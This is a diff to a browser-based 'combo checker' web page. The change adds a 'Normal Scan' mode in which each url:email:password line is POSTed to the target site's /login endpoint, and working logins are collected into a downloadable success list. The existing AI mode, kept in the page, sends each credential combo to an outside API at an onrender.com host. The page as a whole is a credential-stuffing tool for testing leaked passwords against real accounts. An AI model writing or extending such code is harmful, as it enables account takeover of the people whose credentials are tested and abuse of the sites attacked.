@@ -77,6 +77,24 @@
             color: var(--accent-color);
         }
 
+        .radio-group {
+            display: flex;
+            gap: 20px;
+            margin-bottom: 15px;
+        }
+
+        .radio-label {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            cursor: pointer;
+            color: var(--text-primary);
+        }
+
+        input[type="radio"] {
+            cursor: pointer;
+        }
+
         input[type="text"],
         input[type="number"],
         input[type="url"],
@@ -256,6 +274,14 @@
             100% { transform: rotate(360deg); }
         }
 
+        .mode-specific {
+            display: none;
+        }
+
+        .mode-specific.active {
+            display: block;
+        }
+
         @media (max-width: 768px) {
             .container {
                 padding: 10px;
@@ -269,6 +295,9 @@
             .download-buttons {
                 flex-direction: column;
             }
+            .radio-group {
+                flex-direction: column;
+            }
         }
     </style>
 </head>
@@ -279,19 +308,21 @@
         </div>
 
         <div class="panel">
+            <h2 class="panel-title">Scan Mode</h2>
+            <div class="radio-group">
+                <label class="radio-label">
+                    <input type="radio" name="scanMode" value="normal" checked onchange="toggleMode()">
+                    Normal Scan (Faster)
+                </label>
+                <label class="radio-label">
+                    <input type="radio" name="scanMode" value="ai" onchange="toggleMode()">
+                    AI-Powered Scan (Detailed)
+                </label>
+            </div>
+        </div>
+
+        <div class="panel">
             <h2 class="panel-title">Configuration</h2>
-            <div class="input-group">
-                <label>Primary API URL</label>
-                <input type="url" id="primaryApiUrl" value="https://api-y5s2.onrender.com/ask">
-            </div>
-            <div class="input-group">
-                <label>Backup API URL</label>
-                <input type="url" id="backupApiUrl" value="https://api-backup.onrender.com/ask">
-            </div>
-            <div class="input-group">
-                <label>AI Model</label>
-                <input type="text" id="aiModel" value="gpt-4">
-            </div>
             <div class="input-group">
                 <label>Request Delay (ms)</label>
                 <input type="number" id="requestDelay" value="1000" min="0">
@@ -299,6 +330,20 @@
             <div class="input-group">
                 <label>Max Retry Attempts</label>
                 <input type="number" id="maxRetries" value="3" min="1" max="5">
+            </div>
+            <div class="mode-specific" id="aiConfig">
+                <div class="input-group">
+                    <label>Primary API URL</label>
+                    <input type="url" id="primaryApiUrl" value="https://api-y5s2.onrender.com/ask">
+                </div>
+                <div class="input-group">
+                    <label>Backup API URL</label>
+                    <input type="url" id="backupApiUrl" value="https://api-backup.onrender.com/ask">
+                </div>
+                <div class="input-group">
+                    <label>AI Model</label>
+                    <input type="text" id="aiModel" value="gpt-4">
+                </div>
             </div>
         </div>
 
@@ -335,7 +380,7 @@
                 <button class="download-btn" onclick="downloadFailedResults()">
                     <i class="fas fa-download"></i> Failed List
                 </button>
-                <button class="download-btn" onclick="downloadAIAnalysis()">
+                <button class="download-btn mode-specific" id="aiDownloadBtn" onclick="downloadAIAnalysis()">
                     <i class="fas fa-download"></i> AI Analysis
                 </button>
             </div>
@@ -371,10 +416,10 @@
             <div id="logContainer" class="log-container"></div>
         </div>
 
-        <div class="panel">
+        <div class="panel mode-specific" id="aiResults">
             <h2 class="panel-title">AI Analysis</h2>
             <div id="spinner" class="spinner"></div>
-            <div id="aiResults"></div>
+            <div id="aiResultsContainer"></div>
         </div>
     </div>
 
@@ -387,6 +432,19 @@
         let successResults = [];
         let failedResults = [];
         let aiAnalysisResults = [];
+
+        function toggleMode() {
+            const mode = document.querySelector('input[name="scanMode"]:checked').value;
+            const aiElements = document.querySelectorAll('.mode-specific');
+            
+            aiElements.forEach(element => {
+                if (mode === 'ai') {
+                    element.classList.add('active');
+                } else {
+                    element.classList.remove('active');
+                }
+            });
+        }
 
         document.getElementById('comboFile').addEventListener('change', async (e) => {
             try {
@@ -472,6 +530,44 @@
             }
         }
 
+        async function checkComboNormal(combo) {
+            try {
+                const [url, email, password] = combo.split(':');
+                
+                if (!url || !email || !password) {
+                    throw new Error('Invalid combo format');
+                }
+
+                const finalUrl = url.startsWith('http') ? url : `https://${url}`;
+                
+                const response = await fetch(finalUrl + '/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'User-Agent': 'Mozilla/5.0'
+                    },
+                    body: JSON.stringify({
+                        email: email,
+                        password: password
+                    })
+                });
+
+                if (response.ok) {
+                    successCount++;
+                    successResults.push(combo);
+                    log(`Success: ${combo}`, 'success');
+                    return true;
+                } else {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+            } catch (error) {
+                failedCount++;
+                failedResults.push(combo);
+                log(`Failed: ${combo} (${error.message})`, 'error');
+                return false;
+            }
+        }
+
         async function analyzeWithAI(combo) {
             try {
                 showSpinner();
@@ -554,7 +650,7 @@
         }
 
         function displayAIAnalysis(analysis, combo) {
-            const aiResults = document.getElementById('aiResults');
+            const aiResults = document.getElementById('aiResultsContainer');
             const resultDiv = document.createElement('div');
             resultDiv.className = 'ai-result';
 
@@ -588,6 +684,32 @@
 
             aiResults.appendChild(resultDiv);
             aiAnalysisResults.push({combo, analysis});
+        }
+
+        async function checkCombo(combo) {
+            const mode = document.querySelector('input[name="scanMode"]:checked').value;
+            
+            if (mode === 'normal') {
+                return await checkComboNormal(combo);
+            } else {
+                const analysis = await analyzeWithAI(combo);
+                if (analysis) {
+                    displayAIAnalysis(analysis, combo);
+                    
+                    if (analysis.credentialSecurity.riskLevel.toLowerCase() === 'high') {
+                        failedCount++;
+                        failedResults.push(combo);
+                        log(`Failed: ${combo} (High Risk)`, 'error');
+                        return false;
+                    }
+
+                    successCount++;
+                    successResults.push(combo);
+                    log(`Success: ${combo}`, 'success');
+                    return true;
+                }
+                return false;
+            }
         }
 
         function downloadSuccessResults() {
@@ -641,33 +763,6 @@
             log('AI analysis results downloaded', 'success');
         }
 
-        async function checkCombo(combo) {
-            try {
-                const analysis = await analyzeWithAI(combo);
-                if (analysis) {
-                    displayAIAnalysis(analysis, combo);
-                    
-                    if (analysis.credentialSecurity.riskLevel.toLowerCase() === 'high') {
-                        failedCount++;
-                        failedResults.push(combo);
-                        log(`Failed: ${combo} (High Risk)`, 'error');
-                        return false;
-                    }
-
-                    successCount++;
-                    successResults.push(combo);
-                    log(`Success: ${combo}`, 'success');
-                    return true;
-                }
-                return false;
-            } catch (error) {
-                failedCount++;
-                failedResults.push(combo);
-                log(`Failed: ${combo} (${error.message})`, 'error');
-                return false;
-            }
-        }
-
         async function startChecking() {
             try {
                 const combos = document.getElementById('comboInput').value
@@ -692,7 +787,7 @@
                 document.getElementById('startBtn').disabled = true;
                 document.getElementById('stopBtn').disabled = false;
                 document.getElementById('comboInput').disabled = true;
-                document.getElementById('aiResults').innerHTML = '';
+                document.getElementById('aiResultsContainer').innerHTML = '';
 
                 log(`Starting to check ${totalCombos} combos...`, 'info');
 
@@ -733,7 +828,7 @@
         function clearAll() {
             document.getElementById('comboInput').value = '';
             document.getElementById('logContainer').innerHTML = '';
-            document.getElementById('aiResults').innerHTML = '';
+            document.getElementById('aiResultsContainer').innerHTML = '';
             document.getElementById('comboFile').value = '';
             
             totalCombos = 0;
@@ -747,6 +842,9 @@
             updateProgress();
             log('All data cleared', 'info');
         }
+
+        // Initialize mode toggle on page load
+        toggleMode();
     </script>
 </body>
 </html>
